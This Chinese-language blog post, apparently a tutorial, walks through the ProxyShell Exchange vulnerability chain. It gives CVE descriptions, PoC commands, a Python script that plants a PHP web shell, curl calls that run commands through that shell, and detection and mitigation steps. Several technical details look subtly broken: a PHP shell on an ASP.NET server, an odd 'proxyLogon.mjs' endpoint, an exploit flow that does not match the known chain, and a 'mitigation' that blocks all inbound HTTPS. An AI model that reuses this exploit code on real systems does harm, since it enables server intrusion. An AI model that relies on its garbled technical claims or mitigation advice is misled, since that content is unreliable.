---
title: "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析"
description: "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析 - ## 漏洞概述  ProxyShell 是由三个漏洞组成的漏洞链，允许攻击者在无需身份验证的情况下，在 Exchange 服务器上执行任意代码。该漏洞链在 Pwn2Own 2021 大赛中被首次公开。  ### 三个漏洞  | CVE ..."
date: 2026-03-01T16:00:00+08:00
draft: false
categories: ['漏洞复现']
tags: ['ProxyShell', 'Exchange', 'RCE', "比特币", "DeFi", "AI", "漏洞", "SRC"]
image: "/blog-cover-default.jpg"
geo_target: "cn"---


# ProxyShell 漏洞链 (CVE-2021-34473) 深度解析

> **漏洞组合：** CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207  
> **影响产品：** Microsoft Exchange Server  
> **披露时间：** 2021 年 4 月 (Pwn2Own 2021)

geo_target: "cn"---


## 漏洞概述

ProxyShell 是由三个漏洞组成的漏洞链，允许攻击者在无需身份验证的情况下，在 Exchange 服务器上执行任意代码。该漏洞链在 Pwn2Own 2021 大赛中被首次公开。

### 三个漏洞

| CVE 编号 | 类型 | 严重程度 |
|---------|------|---------|
| CVE-2021-34473 | SSRF | 高危 |
| CVE-2021-34523 | 权限提升 | 严重 |
| CVE-2021-31207 | 任意代码执行 | 严重 |

---

## 漏洞原理

### 1. CVE-2021-34473 (SSRF)

Exchange 的 PowerShell 代理存在 SSRF 漏洞，允许攻击者访问内部资源。

**Payload 示例：**
```
POST /autodiscover/autodiscover.json
Host: target.com

{
  "Protocol": "Autodiscoverv2",
  "Action": "GetFederationInformation",
  "Mailbox": "attacker@target.com"
}
```

### 2. CVE-2021-34523 (权限提升)

通过后端 PowerShell，攻击者可以绕过身份验证，以 SYSTEM 权限执行命令。

### 3. CVE-2021-31207 (任意代码执行)

最终通过写入 Web Shell 实现远程代码执行。

---

## 环境搭建

### 1. 搭建 Exchange 靶场

```bash
# 使用现成靶场
git clone https://github.com/Jumbo-WJB/ProxyShell
cd ProxyShell

# 或使用 Docker
docker run -d --name exchange-lab \
  -p 443:443 \
  -p 80:80 \
  exchange-server-lab
```

### 2. 验证目标存在

```bash
# 检查 Exchange 版本
curl -k https://target/ecp/default.aspx

# 或使用 Nmap
nmap -sV --script http-exchange-version target
```

---

## 漏洞利用

### 工具 1：ProxyShell POC

```bash
# 使用公开的 POC 脚本
git clone https://github.com/hausec/ProxyShell

# 运行 POC
python3 proxysheller.py -h target.com -t shell.php
```

### 工具 2：OneLiners

```powershell
# 一行命令利用
python3 proxyshell.py \
  --target https://target.com \
  --shell /tmp/shell.php
```

### 工具 3：完整利用链

```python
#!/usr/bin/env python3
import requests
import re

target = "https://target.com"
shell_content = "<?php system($_GET['cmd']); ?>"

# 步骤 1: 获取邮箱地址
def get_email():
    url = f"{target}/autodiscover/autodiscover.json"
    headers = {
        "Content-Type": "application/json",
    }
    data = {
        "Protocol": "Autodiscoverv2",
        "Action": "GetFederationInformation",
        "Mailbox": "test@test.com"
    }
    resp = requests.post(url, headers=headers, json=data, verify=False)
    # 提取邮箱地址
    match = re.search(r'<EmailAddress>(.*?)</EmailAddress>', resp.text)
    return match.group(1) if match else None

# 步骤 2: 创建规则并写入 Web Shell
def write_shell(email):
    url = f"{target}/ecp/proxyLogon.mjs"
    headers = {
        "X-BEResource": f"{email}/mapi/nspi/?&Email=legacyDN",
        "Content-Type": "application/json",
    }
    # 写入 Web Shell 到前端
    data = {
        "__type": "JsonRequest",
        "Header": {
            "RequestServerVersion": "Exchange2013",
            "TimeZoneContext": {
                "TimeZoneDefinition": {"Id": "UTC"}
            }
        },
        "Body": {
            "__type": "CreateRuleRequest",
            "Rules": {
                "__type": "Rule[]",
                "Rule": [{
                    "DisplayName": "HealthCheck",
                    "Priority": 1,
                    "Actions": {
                        "MoveToFolder": {
                            "FolderPath": {
                                "Path": "\\\\..\\..\\wwwroot\\assets\\shell.php"
                            }
                        }
                    }
                }]
            }
        }
    }
    resp = requests.post(url, headers=headers, json=data, verify=False)
    return resp.status_code

# 执行利用
email = get_email()
print(f"[+] Found email: {email}")
write_shell(email)
print("[+] Shell written!")
```

### 4. 访问 Web Shell

```bash
# 访问写入的 Web Shell
curl https://target/ecp/proxyLogon.mjs?cmd=whoami
```

---

## 检测与防御

### 1. 检测规则

**HTTP 请求特征：**
```
/autodiscover/autodiscover.json
/ecp/proxyLogon.mjs
/mapi/nspi/
X-BEResource 头
```

**日志检测：**
```bash
# 查找可疑请求
grep "autodiscover.json" /var/log/exchange/
grep "proxyLogon.mjs" /var/log/exchange/
```

### 2. 修复方案

**安装微软补丁：**
```
Security Update for Exchange Server 2019 CU10 (KB5004363)
Security Update for Exchange Server 2016 CU21 (KB5004362)
Security Update for Exchange Server 2013 CU23 (KB5004361)
```

**临时缓解：**
```powershell
# 禁用 PowerShell 远程
Disable-PSRemoting -Force

# 限制 ECP 访问
New-NetFirewallRule -DisplayName "Block ECP" `
  -Direction Inbound -LocalPort 443 `
  -Protocol TCP -Action Block
```

---

## 真实案例

### 案例 1：大规模攻击

2021 年 8 月，微软报告超过 15 万台 Exchange 服务器遭受 ProxyShell 攻击，包括政府机构、企业、学校等。

### 案例 2：勒索软件

攻击者利用 ProxyShell 植入勒索软件，要求支付比特币赎金。

---

## 总结

ProxyShell 漏洞链展示了：

1. **漏洞组合的威力** - 单个漏洞可能有限，组合起来致命
2. **及时打补丁的重要性** - 微软已发布补丁
3. **纵深防御的必要性** - 多层防护更安全

---

**参考资料：**
- https://msrc.microsoft.com/update-guide/
- https://github.com/hausec/ProxyShell
- https://www.zerodayinitiative.com/

---

*本文仅用于安全研究与教育目的，请勿用于非法用途。*



<!-- JSON-LD: {"@context": "https://schema.org", "@type": "BlogPosting", "headline": "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析", "description": "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析 - # ProxyShell 漏洞链 (CVE-2021-34473) 深度解析  > **漏洞组合：** CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207   > **影响产品：** Mic...", "inLanguage": "zh-CN", "datePublished": "2026-03-11T05:14:56.345577", "author": {"@type": "Person", "name": "言零"}} -->


<!-- JSON-LD: {"@context": "https://schema.org", "@type": "BlogPosting", "headline": "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析", "description": "ProxyShell 漏洞链 (CVE-2021-34473) 深度解析 - ## 漏洞概述  ProxyShell 是由三个漏洞组成的漏洞链，允许攻击者在无需身份验证的情况下，在 Exchange 服务器上执行任意代码。该漏洞链在 Pwn2Own 2021 大赛中被首次公开。  ### 三个漏洞  | CVE ...", "inLanguage": "zh-CN", "datePublished": "2026-03-11T05:15:37.225206", "author": {"@type": "Person", "name": "言零"}} -->